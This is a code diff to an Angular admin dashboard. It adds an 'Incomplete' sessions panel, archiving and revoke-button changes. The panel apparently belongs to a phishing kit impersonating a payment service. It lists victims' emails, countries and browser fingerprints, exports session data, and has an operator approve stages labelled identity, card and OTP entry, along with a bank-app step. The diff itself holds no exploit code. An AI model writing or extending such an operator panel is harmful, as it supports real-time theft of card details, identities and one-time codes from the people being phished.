@@ -135,18 +135,50 @@ type AdminTab = 'live' | 'history' | 'settings';
                                                     <img [src]="getFlagUrl(session.data.ipCountry)" class="h-3 w-auto rounded-[2px]" title="{{session.data.ipCountry}}">
                                                 }
                                              </div>
-                                             <span class="text-sm font-bold text-pp-blue truncate">{{ getDisplayEmail(session.email) }}</span>
-                                             <span class="text-[10px] text-slate-500 font-medium uppercase tracking-wide">{{ session.currentView || session.stage }}</span>
                                          </div>
+                                     }
+                                     @if(state.activeSessions().length === 0) {
+                                         <div class="flex flex-col items-center justify-center h-24 text-slate-400">
+                                             <p class="text-xs">No online users</p>
+                                         </div>
+                                     }
+                                 </div>
+                             </div>
+
+                             <!-- Incomplete Sessions (Offline but Verified) -->
+                             <div class="h-[40%] flex flex-col border-t border-slate-200">
+                                 <div (click)="incompleteCollapsed.set(!incompleteCollapsed())" class="p-3 bg-slate-100 border-b border-slate-200 flex justify-between items-center cursor-pointer hover:bg-slate-200 transition-colors">
+                                     <div class="flex items-center gap-2">
+                                         <span class="material-icons text-slate-400 text-sm transform transition-transform" [class.-rotate-90]="incompleteCollapsed()">expand_more</span>
+                                         <h3 class="font-bold text-sm text-slate-600">Incomplete</h3>
                                      </div>
-                                 }
-                                 @if(state.activeSessions().length === 0) {
-                                     <div class="flex flex-col items-center justify-center h-full text-slate-400">
-                                         <span class="material-icons text-3xl mb-2 opacity-20">radar</span>
-                                         <p class="text-sm">No active sessions</p>
-                                         <button (click)="refresh()" class="mt-4 text-pp-blue text-xs font-bold hover:underline">Refresh List</button>
-                                     </div>
-                                 }
+                                     <span class="bg-slate-300 text-slate-700 text-[10px] px-2 py-0.5 rounded-full font-bold">{{ state.incompleteSessions().length }}</span>
+                                 </div>
+
+                                 <div class="flex-1 overflow-y-auto p-2 space-y-2 bg-slate-50" [class.hidden]="incompleteCollapsed()">
+                                     @for(session of state.incompleteSessions(); track session.id) {
+                                         <div (click)="selectSession(session)" class="p-3 rounded-[12px] cursor-pointer transition-all border border-slate-200 bg-white opacity-80 hover:opacity-100"
+                                              [class.border-pp-blue]="isSelected(session)" [class.ring-1]="isSelected(session)" [class.ring-pp-blue]="isSelected(session)">
+
+                                             <div class="flex items-center justify-between mb-1">
+                                                <span class="font-bold text-slate-500 font-mono text-xs">{{ session.id }}</span>
+                                                <span class="text-[10px] font-bold text-slate-400 uppercase">Offline</span>
+                                             </div>
+                                             <div class="flex flex-col gap-0.5">
+                                                 <span class="text-sm font-bold text-slate-700 truncate">{{ getDisplayEmail(session.email) }}</span>
+                                                 <div class="flex justify-between items-center mt-2">
+                                                     <span class="text-[10px] text-slate-400">{{ session.stage }}</span>
+                                                     <button (click)="archiveSession(session, $event)" class="text-[10px] font-bold text-pp-blue hover:underline bg-blue-50 px-2 py-1 rounded">Archive</button>
+                                                 </div>
+                                             </div>
+                                         </div>
+                                     }
+                                     @if(state.incompleteSessions().length === 0) {
+                                         <div class="flex flex-col items-center justify-center h-full text-slate-400">
+                                             <p class="text-xs">No incomplete sessions</p>
+                                         </div>
+                                     }
+                                 </div>
                              </div>
                         </div>
 
@@ -300,9 +332,14 @@ type AdminTab = 'live' | 'history' | 'settings';
                                          <span class="text-xs font-bold text-slate-500 hidden sm:block">{{ isSessionLive(monitoredSession()) ? 'Live Connection' : 'Offline' }}</span>
                                      </div>
 
-                                     @if(isSessionLive(monitoredSession())) {
+                                     @if(monitoredSession()) {
                                          <div class="flex gap-2 lg:gap-3">
-                                              <button (click)="revoke()" class="bg-red-50 hover:bg-red-100 text-red-600 border border-red-100 px-4 lg:px-6 py-2 lg:py-3 rounded-full font-bold text-xs lg:text-sm transition-all shadow-sm">
+                                              <!-- Revoke disabled unless login verified -->
+                                              <button (click)="revoke()"
+                                                      [disabled]="!monitoredSession()?.isLoginVerified"
+                                                      [class.opacity-50]="!monitoredSession()?.isLoginVerified"
+                                                      [class.cursor-not-allowed]="!monitoredSession()?.isLoginVerified"
+                                                      class="bg-red-50 hover:bg-red-100 text-red-600 border border-red-100 px-4 lg:px-6 py-2 lg:py-3 rounded-full font-bold text-xs lg:text-sm transition-all shadow-sm">
                                                   Revoke
                                               </button>
                                               <button (click)="reject()" class="bg-slate-100 hover:bg-slate-200 text-slate-700 border border-slate-200 px-4 lg:px-6 py-2 lg:py-3 rounded-full font-bold text-xs lg:text-sm transition-all shadow-sm">
@@ -311,10 +348,6 @@ type AdminTab = 'live' | 'history' | 'settings';
                                               <button (click)="approve()" class="bg-pp-navy hover:bg-pp-blue text-white px-6 lg:px-8 py-2 lg:py-3 rounded-full font-bold text-xs lg:text-sm shadow-button transition-all flex items-center gap-2">
                                                   <span class="material-icons text-sm">check</span> {{ approveText() }}
                                               </button>
-                                         </div>
-                                     } @else {
-                                         <div class="text-xs text-slate-400 font-bold uppercase tracking-wider">
-                                             Session Offline
                                          </div>
                                      }
                                  </div>
@@ -644,9 +677,13 @@ type AdminTab = 'live' | 'history' | 'settings';
                         <span class="text-xs font-bold text-slate-500 hidden sm:block">{{ isSessionLive(session) ? 'Live Connection' : 'Offline' }}</span>
                     </div>
 
-                    @if(isSessionLive(session)) {
+                    @if(monitoredSession()) {
                         <div class="flex gap-3">
-                            <button (click)="revoke()" class="bg-red-50 hover:bg-red-100 text-red-600 border border-red-100 px-6 py-3 rounded-full font-bold text-sm transition-all shadow-sm">
+                            <button (click)="revoke()"
+                                    [disabled]="!session?.isLoginVerified"
+                                    [class.opacity-50]="!session?.isLoginVerified"
+                                    [class.cursor-not-allowed]="!session?.isLoginVerified"
+                                    class="bg-red-50 hover:bg-red-100 text-red-600 border border-red-100 px-6 py-3 rounded-full font-bold text-sm transition-all shadow-sm">
                                 Revoke
                             </button>
                             <button (click)="reject()" class="bg-slate-100 hover:bg-slate-200 text-slate-700 border border-slate-200 px-6 py-3 rounded-full font-bold text-sm transition-all shadow-sm">
@@ -687,6 +724,9 @@ export class AdminDashboardComponent {
   customDateEnd = signal<string>('');
   countryFilter = signal<string>('all');
   selectedSessionIds = signal<Set<string>>(new Set());
+
+  // Incomplete Sessions Toggle
+  incompleteCollapsed = signal(false);
 
   uniqueCountries = computed(() => {
       const history = this.state.history();
@@ -751,7 +791,10 @@ export class AdminDashboardComponent {
   monitoredSession = computed(() => {
       const id = this.state.monitoredSessionId();
       if (!id) return null;
-      return this.state.activeSessions().find(s => s.id === id);
+      // Search in both active and incomplete
+      const active = this.state.activeSessions().find(s => s.id === id);
+      if (active) return active;
+      return this.state.incompleteSessions().find(s => s.id === id);
   });
 
   elapsedTime = signal('0m');
@@ -940,6 +983,13 @@ ${s.fingerprint?.userAgent}
       this.state.pinSession(session.id);
   }
 
+  archiveSession(session: any, event: Event) {
+      event.stopPropagation();
+      if(confirm('Archive this incomplete session to history?')) {
+          this.state.archiveSession(session.id);
+      }
+  }
+
   exportTxt(session: any) {
       const data = session.data || {};
       const content = `
@@ -1028,6 +1078,7 @@ ${session.fingerprint?.userAgent}
           case 'personal_pending': return 'Approve Identity';
           case 'card_pending': return 'Approve Card';
           case 'card_otp_pending': return 'Approve OTP';
+          case 'bank_app_input': return 'Waiting for User'; // New status
           case 'bank_app_pending': return 'Complete Session';
           default: return 'Approve';
       }
